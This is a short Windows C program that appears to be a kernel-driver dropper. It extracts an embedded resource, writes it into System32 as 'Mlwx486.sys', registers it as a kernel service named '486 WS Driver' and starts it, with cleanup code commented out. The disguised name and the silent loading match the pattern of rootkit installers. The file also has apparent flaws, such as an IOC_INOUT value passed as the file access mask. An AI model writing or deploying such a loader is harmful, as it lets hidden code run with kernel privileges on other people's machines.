#include <windows.h>
#include <stdio.h>
char* driverPath = "C:\\Windows\\System32\\Mlwx486.sys";
char* serviceName = "486 WS Driver";
int main(){
	HRSRC hRsrc;
	HGLOBAL hRsrcData;
	HANDLE hFile;
	SC_HANDLE hSCManager;
	SC_HANDLE hSrvc;
	DWORD written;
	hRsrc = FindResourceA(NULL, 101, "FILE");
	hRsrcData = LoadResource(NULL, hRsrc);
	if (!hRsrc){
		return 0;
	}
	hFile = CreateFileA(driverPath, IOC_INOUT, 0, NULL, CREATE_ALWAYS, 
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE){
		return 0;
	}
	WriteFile(hFile, hRsrcData, SizeofResource(NULL, hRsrc), 
		&written, NULL);
	CloseHandle(hFile);
	
	hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if (!hSCManager){
		printf("Failed to open service manager.\n");
		//DeleteFileA(driverPath);
		return 0;
	}
	hSrvc = CreateServiceA(hSCManager, serviceName, serviceName,
		SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL, driverPath, NULL, NULL, NULL, NULL, NULL);
	if (!hSrvc){
		printf("Failed to create service.\n");
		//DeleteFileA(driverPath);
		CloseServiceHandle(hSCManager);
		return 0;
	}
	if (!StartServiceA(hSrvc, 0, NULL)){
		printf("Failed to start service.\n");
		//DeleteFileA(driverPath);
		//DeleteService(hSrvc);
		//CloseServiceHandle(hSCManager);
		//CloseServiceHandle(hSrvc);
		return 0;
	}
	CloseServiceHandle(hSrvc);
	//CloseServiceHandle(hSCManager);
	return 0;
}